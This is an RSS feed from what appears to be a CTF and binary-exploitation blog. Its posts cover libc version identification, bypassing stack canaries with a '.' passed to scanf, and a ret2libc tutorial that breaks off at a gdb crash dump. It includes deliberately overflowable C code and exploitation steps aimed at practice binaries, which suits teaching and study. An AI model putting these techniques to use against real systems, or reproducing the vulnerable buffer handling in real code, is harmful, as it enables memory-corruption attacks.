<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>REhex</title>
    <link>/</link>
    <description>Recent content on REhex</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY 4.0&lt;/a&gt;</copyright>
    <lastBuildDate>Sat, 03 Jul 2021 10:22:09 +0100</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Writeup - Cosy Casino</title>
      <link>/posts/writeup-cosy-casino/</link>
      <pubDate>Sat, 03 Jul 2021 10:22:09 +0100</pubDate>
      
      <guid>/posts/writeup-cosy-casino/</guid>
      <description></description>
      <content>&lt;blockquote&gt;
&lt;p&gt;Welcome to Cosy Casino. Try your luck to win a bunch of 💎 and become a millionaire! Be careful not to be addicted though.. Rules: No smoking, no guns and no pets are allowed inside the Casino, especially canaries..&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;general-hints&#34;&gt;General Hints&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Gallopsled/pwntools&#34;&gt;pwntools&lt;/a&gt; lib is your friend&lt;/li&gt;
&lt;li&gt;copy-pasted code tends to be vulnerable if pasted incorrectly ;)&lt;/li&gt;
&lt;li&gt;check where stack variables of threat functions are located&lt;/li&gt;
&lt;li&gt;remember that you can always patch the local binary to make your life easier&lt;/li&gt;
&lt;li&gt;sometimes the only way to bypass the canary is to forge own canary&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;writeup&#34;&gt;Writeup&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;This task is still live, so the writeup is available only in &lt;a href=&#34;https://link-to-cyberchef&#34;&gt;encrypted form&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Use flag from challenge to read the writeup, public version of writeup will be released after this task will be retired.&lt;/p&gt;
&lt;/blockquote&gt;</content>
    </item>
    
    <item>
      <title>pwn&gt; Finding the libc version</title>
      <link>/posts/identifying-libc/</link>
      <pubDate>Mon, 14 Jun 2021 21:32:42 +0200</pubDate>
      
      <guid>/posts/identifying-libc/</guid>
      <description>&lt;p&gt;How to find the libc version without having its local copy.&lt;/p&gt;</description>
      <content>&lt;p&gt;How to find the libc version without having its local copy.&lt;/p&gt;
&lt;h2 id=&#34;scenario&#34;&gt;Scenario&lt;/h2&gt;
&lt;p&gt;Todays scenario is similar to the one described in my &lt;a href=&#34;/posts/ret2libc&#34;&gt;previous artice&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we have the binary vulnerable to &lt;em&gt;ret2libc&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;we managed to leak the address of puts in memory&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;but&lt;/strong&gt; we don&amp;rsquo;t have the libc given, so we can&amp;rsquo;t calculate the offsets in memory&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Leak the address of &lt;em&gt;any function&lt;/em&gt; in memory&lt;/li&gt;
&lt;li&gt;Go to libc database &lt;a href=&#34;https://libc.blukat.me/&#34;&gt;1&lt;/a&gt; or &lt;a href=&#34;https://libc.nullbyte.cat/&#34;&gt;2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Fill the form with function name and last 3 characters of address and press search&lt;/li&gt;
&lt;li&gt;Download provided libc binary or use the offsets provided by database&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/img/libc.png&#34; alt=&#34;libc&#34;&gt;&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>pwn&gt; scanf and hateful dot</title>
      <link>/posts/scanf-and-hateful-dot/</link>
      <pubDate>Thu, 10 Jun 2021 15:32:42 +0200</pubDate>
      
      <guid>/posts/scanf-and-hateful-dot/</guid>
      <description>&lt;p&gt;How to bypass the stack canary with &lt;code&gt;.&lt;/code&gt; (dot) and &lt;code&gt;scanf&lt;/code&gt;.&lt;/p&gt;</description>
      <content>&lt;p&gt;How to bypass the stack canary with &lt;code&gt;.&lt;/code&gt; (dot) and &lt;code&gt;scanf&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;scenario&#34;&gt;Scenario&lt;/h2&gt;
&lt;p&gt;Imagine that you have given binary implemented by following code (compiled with default settings):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;

    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How many numbers do you want to add?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;n);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;n; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Number[%d]: &amp;#34;&lt;/span&gt;, i);
        scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;buffer[i]);
        s &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; buffer[i];
    }
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your sum: %lf&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, s);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
    sum();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Above code obviously trusts user input and allows to overwrite arbritrary data which can be weaponized with &lt;a href=&#34;/posts/ret2libc&#34;&gt;ret2libc&lt;/a&gt; and lead to gaining the shell. But there is one big problem - stack canary:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;overwriting stack canary will cause exception&lt;/li&gt;
&lt;li&gt;we can&amp;rsquo;t brute-force the stack cookie (program is not giving us such possibility)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-C0h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+14h] [rbp-BCh]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-B8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-B0h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+C8h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0&lt;/span&gt;;
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How many numbers do you want to add?&amp;#34;&lt;/span&gt;);
  scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v1);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v1; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Number[%d]: &amp;#34;&lt;/span&gt;, i);
    scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v4[i]);
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v4[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v3;
  }
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your sum: %lf&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, v3);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; v5;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;game-over-not-exactly-&#34;&gt;Game Over? Not exactly ;)&lt;/h2&gt;
&lt;p&gt;Notice that user input is collected with &lt;code&gt;scanf(&amp;quot;%lf&amp;quot;, &amp;amp;buffer[i])&lt;/code&gt; and here is the trick: you can pass &lt;code&gt;.&lt;/code&gt; (dot) as input, which will &lt;em&gt;skip&lt;/em&gt; overwriting the data in referenced variable:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Number[20]: .
Number[21]: .
Your sum: -92773155265697924505313227519998636757689855298695787655081074157174089977436344947792687303154543628009248831613884078618796617025716224.000000
[Inferior 1 (process 29710) exited normally]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;scanf-under-the-hood&#34;&gt;scanf under the hood&lt;/h2&gt;
&lt;h3 id=&#34;what&#34;&gt;What&lt;/h3&gt;
&lt;p&gt;First question which comes to mind after seeing this trick is &lt;em&gt;Why it happens&lt;/em&gt; - I will try to answer to this question in the next section - and &lt;em&gt;Is it working only for doubles?&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;I created a very simple test program which will help us understand the scope of this trick without reading the source:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;double&lt;/span&gt; foo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3.7&lt;/span&gt;;
        scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;foo);
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lf&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, foo);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;According to my test results:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;integer numbers (tested on &lt;code&gt;%d&lt;/code&gt;)
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.&lt;/code&gt; and &lt;code&gt;.5&lt;/code&gt; don&amp;rsquo;t overwrite the data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;floating point numbers (tested on &lt;code&gt;$d&lt;/code&gt;, &lt;code&gt;%lf&lt;/code&gt;)
&lt;ul&gt;
&lt;li&gt;only &lt;code&gt;.&lt;/code&gt; don&amp;rsquo;t overwrite the data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hexadecimal numbers
&lt;ul&gt;
&lt;li&gt;only &lt;code&gt;.&lt;/code&gt; don&amp;rsquo;t overwrite the data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;strings (&lt;code&gt;%s&lt;/code&gt;)
&lt;ul&gt;
&lt;li&gt;data is always overwritten (as expected)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Summarizing our findings - it seems that &lt;code&gt;.&lt;/code&gt; affects all numeric string formats&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;h3 id=&#34;why&#34;&gt;Why&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;This part is partially based on the intuition, so it don&amp;rsquo;t have to be 100% accurate&lt;/p&gt;
&lt;p&gt;Source Code can be found  [here]&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Keeping the long story short:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;in &lt;code&gt;_IO_vfscanf_internal&lt;/code&gt; all characters are checked and parsed one by one&lt;/li&gt;
&lt;li&gt;legit characters are stored in &lt;code&gt;struct char_buffer charbuf;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;numeric values divided by &lt;code&gt;.&lt;/code&gt; are decomposed into separate values and then converted appropriately into the value of choosen type (&lt;strong&gt;ints&lt;/strong&gt;: only characters before  &lt;code&gt;.&lt;/code&gt; are parsed; &lt;strong&gt;floats&lt;/strong&gt;: everything before &lt;code&gt;.&lt;/code&gt; is interpreted as &lt;code&gt;0&lt;/code&gt; only if data is available behind the dot).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Scanf_format_string&#34;&gt;https://en.wikipedia.org/wiki/Scanf_format_string&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://git.launchpad.net/glibc/tree/stdio-common/vfscanf-internal.c&#34;&gt;https://git.launchpad.net/glibc/tree/stdio-common/vfscanf-internal.c&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;</content>
    </item>
    
    <item>
      <title>pwn&gt; ret2libc by example</title>
      <link>/posts/ret2libc/</link>
      <pubDate>Tue, 01 Jun 2021 12:32:42 +0200</pubDate>
      
      <guid>/posts/ret2libc/</guid>
      <description>&lt;p&gt;How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp;amp; pwntools by example.&lt;/p&gt;</description>
      <content>&lt;p&gt;How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp;amp; pwntools by example.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTICE&lt;/strong&gt; I&amp;rsquo;m not very experienced in the &amp;ldquo;offensive RE&amp;rdquo; ~&amp;gt; pwns. If you will find some mistakes in my explainations, then please let me know in the comments :)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;exploitable (linux) binary&lt;/li&gt;
&lt;li&gt;python3 + pwntools (I&amp;rsquo;m using it in virtualenv)&lt;/li&gt;
&lt;li&gt;GDB + gef&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# quick install&lt;/span&gt;
sudo apt install gdb python3 python3-pip

&lt;span style=&#34;color:#75715e&#34;&gt;# install gef (https://github.com/hugsy/gef)&lt;/span&gt;
wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py
echo source ~/.gdbinit-gef.py &amp;gt;&amp;gt; ~/.gdbinit

&lt;span style=&#34;color:#75715e&#34;&gt;# install pwntools in virtualenv (https://docs.pwntools.com/en/stable/)&lt;/span&gt;
pip install virtualenv
virtualenv -p python3 venv
. ./venv/bin/activte
pip install pwntools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;My exploitable binary have following properties:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  checksec
[+] checksec for &#39;binary&#39;
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Full
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;hunt-for-the-exploitable-code&#34;&gt;Hunt for the exploitable code&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;This tutorial will focus only on binaries with enabled relocation, it will fully ignore the PIE or stack canaries.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The easiest way to find the exploitable code is actually to play with the binary, learn about it&amp;rsquo;s background. It is worth noticing that exploitable functionality will be triggered from somewhere where binary interacts with the user (receive &amp;amp; parse packets, user input, configs)&lt;/p&gt;
&lt;p&gt;In my case the binary have only 4 &amp;ldquo;input fields&amp;rdquo; and only one of them allows to overwrite the allocated buffer:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ida pseudo-code:
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fill&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+0h] [rbp-20h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  memset(buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf));
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much data do you want to store?&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &amp;#34;&lt;/span&gt;)
  read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400uLL&lt;/span&gt;);                       &lt;span style=&#34;color:#75715e&#34;&gt;// buffer can be overwritten
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Enjoy your %s&amp;#34;&lt;/span&gt;, buf);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;buf&lt;/code&gt; can handle only 32 bytes, but &lt;code&gt;read&lt;/code&gt; can read 400, so we should be to fully fill the buffer and overwrite the return address. Stack looks like that:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;+----------------+
|  return addr   |   &amp;lt;- saved address of return when call fill was exeuted
+----------------+
|   stored_rbp   |   &amp;lt;- saved RBP
+----------------+
|                |
|     buffer     |   &amp;lt;- local variables
|                |
+----------------+
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ASM &lt;code&gt;call &amp;lt;func&amp;gt;&lt;/code&gt; is contained from the 2 instructions: &lt;code&gt;push $rip+1, jmp &amp;lt;func&amp;gt;&lt;/code&gt;, so it saves the address of the next instruction and performs jump to the called function.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ret&lt;/code&gt; is analogical, it consists of &lt;code&gt;pop&lt;/code&gt; &amp;amp; &lt;code&gt;jmp&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;prove-that-you-are-in-control&#34;&gt;Prove that you are in control&lt;/h2&gt;
&lt;p&gt;Next natural step is to verify that we actually can control the &lt;code&gt;rip&lt;/code&gt; registry, the easiest way to achieve that is to run it in gdb with gef installed and generate the pattern:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;gef➤  pattern create 60
[+] Generating a pattern of 60 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
[+] Saved as &#39;$_gef0&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Protip&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Generated pattern is using readable characters which are containing unique set of characters which can be easily located in the string for identifying the offset of specified substring.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then just use generated payload as input data in potentially vulnerable functionality. In my case I had to navigate to the proper menu and paste the payload as choice option. As result the program crashed and gdb handled the exception:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;&amp;gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa

Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x49
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
$rsp   : 0x00007fffffffe278  →  &amp;quot;faaaaaaagaaaaaaahaaa\n&amp;quot;
$rbp   : 0x6161616161616165 (&amp;quot;eaaaaaaa&amp;quot;?)
$rsi   : 0x00007fffffffbbb0  →  &amp;quot;Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaa&amp;quot;
$rdi   : 0x1
$rip   : 0x0000000000400eec  →  &amp;lt;fill+162&amp;gt; ret
$r8    : 0x49
$r9    : 0x3d
$r10   : 0xffffffc3
$r11   : 0x246
$r12   : 0x00000000004006e0  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
$r13   : 0x00007fffffffe370  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe278│+0x0000: &amp;quot;faaaaaaagaaaaaaahaaa\n&amp;quot;     ← $rsp
0x00007fffffffe280│+0x0008: &amp;quot;gaaaaaaahaaa\n&amp;quot;
0x00007fffffffe288│+0x0010: 0x0000000a61616168 (&amp;quot;haaa\n&amp;quot;?)
0x00007fffffffe290│+0x0018: 0x0000000000401040  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
0x00007fffffffe298│+0x0020: 0x00007ffff7a05b97  →  &amp;lt;__libc_start_main+231&amp;gt; mov edi, eax
0x00007fffffffe2a0│+0x0028: 0x0000000000000001
0x00007fffffffe2a8│+0x0030: 0x00007fffffffe378  →  0x00007fffffffe5eb  →  &amp;quot;/tmp/binary&amp;quot;
